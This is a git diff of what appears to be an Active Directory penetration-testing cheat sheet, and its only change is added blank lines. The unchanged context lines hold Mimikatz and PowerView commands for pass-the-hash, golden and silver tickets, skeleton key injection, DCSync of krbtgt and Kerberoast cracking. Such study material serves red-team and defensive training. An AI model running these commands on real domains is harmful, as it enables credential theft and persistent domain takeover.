@@ -86,6 +86,7 @@ Get-ADUser -Filter * -Properties * | select name
 # Displays when the password was set
 Get-ADUser -Filter * -Properties * | select name,@{expression={[datetime]::fromFileTime($_.pwdlastset)}}
 ```
+
 ### Domain Admins Enumeration
 
 - **With PowerView:**
@@ -333,6 +334,7 @@ Invoke-Mimikatz -Command '"sekurlsa::pth /user:admin /domain:corporate.corp.loca
 # Persistence
 
 ### Golden Ticket
+
 - **Invoke-Mimikatz:**
 ```powershell
 # Execute mimikatz on DC as DA to get hashes
@@ -342,6 +344,7 @@ Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:corporat
 ```
 
 ### Silver Ticket
+
 - **Invoke-Mimikatz:**
 ```powershell
 # Silver Ticket for service HOST
@@ -349,6 +352,7 @@ Invoke-Mimikatz -Command '"kerberos::golden /domain:corporate.corp.local /sid:S-
 ```
 
 ### Skeleton Key
+
 - **Invoke-Mimikatz:**
 ```powershell
 # Command to inject a skeleton key
@@ -356,6 +360,7 @@ Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"'-ComputerName dcor
 ```
 
 ### DCSync
+
 - **With PowerView and Invoke-Mimikatz:**
 ```powershell
 # Check if user01 has these permissions
@@ -369,6 +374,7 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
 # Privilege Escalation
 
 ### Kerberoast
+
 **1. Enumeration with Powerview:**
 ```powershell
 # Find user accounts used as Service accounts with PowerView
@@ -397,6 +403,7 @@ python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\3-40a10000-svcadmin@MSSQLSvc~
 ```
 
 ### Targeted Kerberoasting AS REPs
+
 **1. Enumeration with Powerview dev Version:**
 ```powershell
 # Enumerating accounts with Kerberos Preauth disabled
